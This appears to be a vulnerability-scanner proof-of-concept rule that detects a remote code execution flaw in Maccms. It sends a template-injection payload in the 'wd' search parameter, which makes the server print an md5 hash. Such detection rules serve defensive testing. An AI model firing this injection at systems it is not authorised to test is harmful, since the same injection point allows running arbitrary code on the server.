expression: r0()
id: maccms-rce
info:
  author: hanxiansheng26(https://github.com/hanxiansheng26)
  name: Maccms RCE
  severity: critical
rules:
  r0:
    expression: response.body.bcontains(bytes(md5(string(r))))
    request:
      method: GET
      path: /index.php?m=vod-search&wd={if-A:printf(md5({{r}}))}{endif-A}
set:
  r: randomInt(800000000, 1000000000)
